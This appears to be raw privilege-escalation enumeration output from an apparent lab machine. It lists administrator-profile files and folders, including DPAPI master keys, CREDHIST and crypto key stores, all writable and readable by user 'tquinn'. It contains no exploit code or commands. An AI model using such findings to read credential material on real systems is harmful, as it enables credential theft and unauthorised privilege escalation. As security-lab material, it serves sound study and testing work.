     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MSPaint_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.People_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.People_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.People_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.People_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.People_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Print3D_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Print3D_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Print3D_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ScreenSketch_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ScreenSketch_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ScreenSketch_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\SystemAppData\Helium\User.dat": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\SystemAppData\Helium\User.dat.LOG1": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\SystemAppData\Helium\User.dat.LOG2": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\SystemAppData\Helium\UserClasses.dat": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\SystemAppData\Helium\UserClasses.dat.LOG1": tquinn [Allow: AllAccess]                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\SystemAppData\Helium": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\SystemAppData\Helium\UserClasses.dat.LOG2": tquinn [Allow: AllAccess]                                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\Settings\settings.dat": tquinn [Allow: AllAccess]                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\Settings": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\settings.json": tquinn [Allow: AllAccess]                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Preferences": tquinn [Allow: AllAccess]                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Network Persistent State": tquinn [Allow: AllAccess]         
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\device-info.json": tquinn [Allow: AllAccess]                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Cookies-journal": tquinn [Allow: AllAccess]                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store": tquinn [Allow: AllAccess]                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Cookies": tquinn [Allow: AllAccess]                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\SkypeRT": tquinn [Allow: AllAccess]                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\SkypeRT\persistent.conf": tquinn [Allow: AllAccess]          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\skylib": tquinn [Allow: AllAccess]                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\skylib\slimcore-0-1289742582.blog": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Local Storage\leveldb\000003.log": tquinn [Allow: AllAccess] 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Local Storage\leveldb\CURRENT": tquinn [Allow: AllAccess]    
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Local Storage\leveldb\LOCK": tquinn [Allow: AllAccess]       
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Local Storage\leveldb\LOG": tquinn [Allow: AllAccess]        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Local Storage\leveldb\LOG.old": tquinn [Allow: AllAccess]    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Local Storage\leveldb": tquinn [Allow: AllAccess]          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Local Storage\leveldb\MANIFEST-000001": tquinn [Allow: AllAccess]                                                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\GPUCache\index": tquinn [Allow: AllAccess]                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\GPUCache\data_3": tquinn [Allow: AllAccess]                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\GPUCache\data_2": tquinn [Allow: AllAccess]                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\GPUCache\data_1": tquinn [Allow: AllAccess]                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\GPUCache": tquinn [Allow: AllAccess]                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\GPUCache\data_0": tquinn [Allow: AllAccess]                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\CS_skylib": tquinn [Allow: AllAccess]                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\CS_skylib\CS_shared.conf": tquinn [Allow: AllAccess]         
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Code Cache\js": tquinn [Allow: AllAccess]                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Code Cache\js\index": tquinn [Allow: AllAccess]              
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Code Cache\js\index-dir": tquinn [Allow: AllAccess]        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Code Cache\js\index-dir\the-real-index": tquinn [Allow: AllAccess]                                                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Cache\index": tquinn [Allow: AllAccess]                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Cache\data_3": tquinn [Allow: AllAccess]                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Cache\data_2": tquinn [Allow: AllAccess]                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Cache\data_1": tquinn [Allow: AllAccess]                     
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Cache": tquinn [Allow: AllAccess]                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalCache\Roaming\Microsoft\Skype for Store\Cache\data_0": tquinn [Allow: AllAccess]                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Wallet_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Wallet_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Wallet_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                           
     Folder Permissions "c:\users\administrator\AppData\Roaming\NuGet": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\AppData\Roaming\NuGet\nuget.config": tquinn [Allow: AllAccess]                                                                                                    
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Protect\SYNCHIST": tquinn [Allow: AllAccess]                                                                                            
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Protect": tquinn [Allow: AllAccess]                                                                                                   
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Protect\CREDHIST": tquinn [Allow: AllAccess]                                                                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-500\Preferred": tquinn [Allow: AllAccess]                                             
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-500\BK-RLAB": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-500\9a743bf3-e15d-4b79-8705-48350129082a": tquinn [Allow: AllAccess]                  
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-500": tquinn [Allow: AllAccess]                                                     
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-500\732e4d25-3a4d-409b-863c-11a65ad2f1ed": tquinn [Allow: AllAccess]                  
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\SystemCertificates\My": tquinn [Allow: AllAccess]                                                                                     
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\SystemCertificates\My\AppContainerUserCertRead": tquinn [Allow: AllAccess]                                                              
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Crypto\Keys": tquinn [Allow: AllAccess]                                                                                               
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_3d9ceac0-7d76-4fd5-b048-15a761d1dee8": tquinn [Allow: AllAccess]                           
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\File Explorer.lnk": tquinn [Allow: AllAccess]                                        
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\desktop.ini": tquinn [Allow: AllAccess]                                              
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Microsoft Edge.lnk": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk": tquinn [Allow: AllAccess]                                                            
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\MMC\services": tquinn [Allow: AllAccess]                                                                                                
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\MMC": tquinn [Allow: AllAccess]                                                                                                       
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\MMC\taskschd": tquinn [Allow: AllAccess]                                                                                                
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Network\Connections\Pbk\_hiddenPbk": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Network\Connections\Pbk\_hiddenPbk\rasphone.pbk": tquinn [Allow: AllAccess]                                                             
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Themes": tquinn [Allow: AllAccess]                                                                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper": tquinn [Allow: AllAccess]                                                                          
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\OneDrive.lnk": tquinn [Allow: AllAccess]                                                                    
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\desktop.ini": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell ISE.lnk": tquinn [Allow: AllAccess]                                   
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell ISE (x86).lnk": tquinn [Allow: AllAccess]                             
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk": tquinn [Allow: AllAccess]                                 
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\desktop.ini": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run.lnk": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Desktop.ini": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Control Panel.lnk": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\computer.lnk": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Administrative Tools.lnk": tquinn [Allow: AllAccess]                                           
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini": tquinn [Allow: AllAccess]                                                             
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini": tquinn [Allow: AllAccess]                                                         
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools\desktop.ini": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Internet Explorer.lnk": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\desktop.ini": tquinn [Allow: AllAccess]                                                         
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\On-Screen Keyboard.lnk": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Narrator.lnk": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Magnify.lnk": tquinn [Allow: AllAccess]                                                       
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessibility": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\desktop.ini": tquinn [Allow: AllAccess]                                                       
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu": tquinn [Allow: AllAccess]                                                                                        
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Start Menu\desktop.ini": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\SendTo\Mail Recipient.MAPIMail": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\SendTo\Fax Recipient.lnk": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\SendTo\Documents.mydocs": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\SendTo\desktop.ini": tquinn [Allow: AllAccess]                                                                                  
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\SendTo\Desktop (create shortcut).DeskLink": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\SendTo\Compressed (zipped) Folder.ZFSendToTarget": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\SendTo": tquinn [Allow: AllAccess]                                                                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\SendTo\Bluetooth File Transfer.LNK": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms": tquinn [Allow: AllAccess]                              
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\9b9cdc69c1c24e2b.automaticDestinations-ms": tquinn [Allow: AllAccess]                              
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms": tquinn [Allow: AllAccess]                              
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\fa02aa2c575837a6.automaticDestinations-ms": tquinn [Allow: AllAccess]                              
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\8e4e81d9adc545b8.customDestinations-ms": tquinn [Allow: AllAccess]                                    
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b916037c1e115fe0.customDestinations-ms": tquinn [Allow: AllAccess]                                    
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations": tquinn [Allow: AllAccess]                                                                         
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\ccba5a5986c77e43.customDestinations-ms": tquinn [Allow: AllAccess]                                    
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\htb.lnk": tquinn [Allow: AllAccess]                                                                                      
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent": tquinn [Allow: AllAccess]                                                                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\vmtools_check.lnk": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Libraries\Videos.library-ms": tquinn [Allow: AllAccess]                                                                         
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Libraries\Pictures.library-ms": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Libraries\Music.library-ms": tquinn [Allow: AllAccess]                                                                          
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Libraries\Documents.library-ms": tquinn [Allow: AllAccess]                                                                      
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Libraries": tquinn [Allow: AllAccess]                                                                                         
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\Libraries\desktop.ini": tquinn [Allow: AllAccess]                                                                               
     Folder Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\AccountPictures": tquinn [Allow: AllAccess]                                                                                   
     File Permissions "c:\users\administrator\AppData\Roaming\Microsoft\Windows\AccountPictures\desktop.ini": tquinn [Allow: AllAccess]                                                                         
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\FB0D848F74F70BB2EAA93746D24D9749": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\8993AA66149348CA2D0B9DE73F9084A1": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\80237EE4964FC9C409AAF55BF996A292_E503B048B745DFA14B81FCFC68D6DECE": tquinn [Allow: AllAccess]                
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\80237EE4964FC9C409AAF55BF996A292_D46D6FA25B74360E1349F9015B5CCE53": tquinn [Allow: AllAccess]                
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\80237EE4964FC9C409AAF55BF996A292_C5130A0BDC8C859A2757D77746C10868": tquinn [Allow: AllAccess]                
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\77EC63BDA74BD0D0E0426DC8F8008506": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\7423F88C7F265F0DEFC08EA88C3BDE45_AA1E8580D4EBC816148CE81268683776": tquinn [Allow: AllAccess]                
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\57C8EDB95DF3F0AD4EE2DC2B8CFD4157": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\4E4160FB650E5091C535216313A4ECD3_C830356EF6A2FF5E1E0A151AF6B8D0FA": tquinn [Allow: AllAccess]                
     Folder Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData": tquinn [Allow: AllAccess]                                                                                
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\30069012ED3CF5DB92F9F4FC78D55E2D_87238437CEFCADF00F1385E31A888EF4": tquinn [Allow: AllAccess]                
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\FB0D848F74F70BB2EAA93746D24D9749": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\8993AA66149348CA2D0B9DE73F9084A1": tquinn [Allow: AllAccess]                                                  
